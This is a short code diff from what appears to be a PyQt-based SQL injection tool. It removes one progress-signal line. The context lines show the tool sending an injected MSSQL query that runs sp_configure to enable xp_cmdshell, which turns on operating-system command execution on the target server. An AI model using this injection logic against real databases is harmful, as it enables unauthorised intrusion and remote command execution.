@@ -148,7 +148,6 @@ class Worker(QtCore.QThread):
         "sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure", True)
         query =  self.wq.buildQuery(core.txtproc.correctQstr(self.qstrings['mssql_error_based']['exec_hex']), self.vars, {'hex' : hex})
         self.wq.httpRequest(query, True, self.vars)
-        self.progressSignal.emit(0, True)
         
     def xp_cmdshell(self):
         execStr = core.txtproc.correctQstr(self.qstrings['mssql_error_based']['exec_hex'])
